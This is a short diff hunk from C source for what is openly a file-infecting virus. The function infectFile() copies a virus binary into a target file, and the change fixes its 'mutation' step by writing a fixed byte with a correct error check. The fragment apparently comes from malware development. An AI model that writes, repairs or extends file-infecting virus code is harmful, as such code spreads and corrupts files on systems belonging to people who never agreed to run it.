@@ -160,8 +160,8 @@ int infectFile(char *fileToInfectName, char *virusBinName) {
     fclose(virusFile);
 
     // Insert byte of useless data (mutation)
-    // We insert a single byte from the address of fileToInfect
-    if (fwrite(&fileToInfect, 1, 1, tempFile) < 0) {
+    char mutationByte = 0x00;
+    if (fwrite(&mutationByte, 1, 1, tempFile) != 1) {
         perror("Could not write mutation byte to temp file");
         fclose(fileToInfect);
         fclose(tempFile);
